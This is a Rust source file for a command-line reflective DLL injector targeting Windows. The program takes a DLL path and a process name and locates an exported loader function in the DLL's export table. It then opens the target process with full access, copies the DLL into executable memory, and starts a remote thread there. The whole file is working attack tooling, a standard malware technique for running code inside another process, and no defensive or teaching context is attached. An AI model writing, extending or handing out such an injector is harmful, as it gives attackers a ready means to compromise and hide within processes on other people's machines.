use std::env;
use std::fs;
use std::ptr;
use core::ffi::CStr;

use windows_sys::Win32::Foundation::{HANDLE, CloseHandle, INVALID_HANDLE_VALUE};
use windows_sys::Win32::System::Threading::{
    OpenProcess, CreateRemoteThread, PROCESS_ALL_ACCESS, LPTHREAD_START_ROUTINE
};
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    WriteProcessMemory, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
    IMAGE_DIRECTORY_ENTRY_EXPORT
};
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS
};

const EXPORTED_FUNC_NAME: &str = "my_reflective_fun";

fn main() {
    let args: Vec<String> = env::args().collect();
    let mut dll_path = String::new();
    let mut target_process = String::new();

    for i in 0..args.len() {
        if args[i] == "-rfldll" && i + 1 < args.len() {
            dll_path = args[i + 1].clone();
        }
        if args[i] == "-p" && i + 1 < args.len() {
            target_process = args[i + 1].clone();
        }
    }

    if dll_path.is_empty() || target_process.is_empty() {
        println!("Usage: injector.exe -rfldll <path_to_dll> -p <process_name>");
        return;
    }

    let dll_buffer = fs::read(&dll_path).expect("Failed to read the DLL file");
    println!("[+] DLL read: {} bytes", dll_buffer.len());

    let offset = get_reflective_function_offset(dll_buffer.as_ptr())
        .expect("Could not find ReflectiveFunction export");
    println!("[+] Found '{}' at file offset: 0x{:X}", EXPORTED_FUNC_NAME, offset);

    let pid = get_process_id_by_name(&target_process).expect("Target process not found");
    println!("[+] Target found (PID: {})", pid);

    unsafe {
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        // Corrected pointer comparison
        if h_process == ptr::null_mut() {
            println!("[!] Failed to open target process");
            return;
        }

        if inject_and_run(h_process, offset, &dll_buffer) {
            println!("[+] Injection completed successfully");
        } else {
            println!("[!] Injection failed");
        }

        CloseHandle(h_process);
    }
}

/// Converts a Relative Virtual Address (RVA) to a raw file offset.
pub unsafe fn rva_to_offset(rva: u32, base: *const u8) -> u32 {
    unsafe {
        let dos = base as *const IMAGE_DOS_HEADER;
        let nt = (base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

        let section_header_start = (ptr::addr_of!((*nt).OptionalHeader) as usize)
            + ((*nt).FileHeader.SizeOfOptionalHeader as usize);

        let sections = section_header_start as *const IMAGE_SECTION_HEADER;
        let num_sections = (*nt).FileHeader.NumberOfSections;

        for i in 0..num_sections {
            let sec = &*sections.add(i as usize);
            if rva >= sec.VirtualAddress && rva < sec.VirtualAddress + sec.Misc.VirtualSize {
                return rva - sec.VirtualAddress + sec.PointerToRawData;
            }
        }

        rva
    }
}


/// Parses the export table of the DLL in its raw file state to find the ReflectiveFunction's offset.
pub fn get_reflective_function_offset(p_base: *const u8) -> Option<u32> {
    unsafe {
        let dos_header = p_base as *const IMAGE_DOS_HEADER;
        let nt_headers = (p_base as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

        let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
        if export_dir_rva == 0 { return None; }

        let export_dir_offset = rva_to_offset(export_dir_rva, p_base);
        let p_export_dir = (p_base as usize + export_dir_offset as usize) as *const IMAGE_EXPORT_DIRECTORY;

        let names_offset = rva_to_offset((*p_export_dir).AddressOfNames, p_base);
        let funcs_offset = rva_to_offset((*p_export_dir).AddressOfFunctions, p_base);
        let ordinals_offset = rva_to_offset((*p_export_dir).AddressOfNameOrdinals, p_base);

        let names = (p_base as usize + names_offset as usize) as *const u32;
        let functions = (p_base as usize + funcs_offset as usize) as *const u32;
        let ordinals = (p_base as usize + ordinals_offset as usize) as *const u16;

        for i in 0..(*p_export_dir).NumberOfNames {
            let name_rva = *names.add(i as usize);
            let name_offset = rva_to_offset(name_rva, p_base);
            let current_name = CStr::from_ptr((p_base as usize + name_offset as usize) as *const i8);

            if current_name.to_str().unwrap_or("") == EXPORTED_FUNC_NAME {
                let ordinal = *ordinals.add(i as usize);
                let func_rva = *functions.add(ordinal as usize);

                let func_offset = rva_to_offset(func_rva, p_base);
                if func_offset == 0 { return None; }

                return Some(func_offset);
            }
        }
    }
    None
}

/// Injects the DLL buffer into the remote process and starts a thread at the function offset.
pub unsafe fn inject_and_run(h_process: HANDLE, rfl_func_offset: u32, dll_buffer: &[u8]) -> bool {
    unsafe {
        let p_remote_address = VirtualAllocEx(
            h_process,
            ptr::null(),
            dll_buffer.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if p_remote_address.is_null() { return false; }

        let mut bytes_written = 0;
        let status = WriteProcessMemory(
            h_process,
            p_remote_address,
            dll_buffer.as_ptr() as _,
            dll_buffer.len(),
            &mut bytes_written,
        );

        if status == 0 || bytes_written != dll_buffer.len() { return false; }

        let thread_start_addr = (p_remote_address as usize + rfl_func_offset as usize) as *const ();
        let thread_start: LPTHREAD_START_ROUTINE = core::mem::transmute(thread_start_addr);

        let h_thread = CreateRemoteThread(
            h_process,
            ptr::null(),
            0,
            thread_start,
            p_remote_address,
            0,
            ptr::null_mut(),
        );

        if h_thread == ptr::null_mut() { return false; }
        CloseHandle(h_thread);
        true
    }
}


fn get_process_id_by_name(process_name: &str) -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE { return None; }

        let mut entry: PROCESSENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut entry) != 0 {
            loop {
                let current_name = CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8)
                    .to_str()
                    .unwrap_or("");

                if current_name.to_lowercase() == process_name.to_lowercase() {
                    CloseHandle(snapshot);
                    return Some(entry.th32ProcessID);
                }

                if Process32Next(snapshot, &mut entry) == 0 { break; }
            }
        }
        CloseHandle(snapshot);
    }
    None
}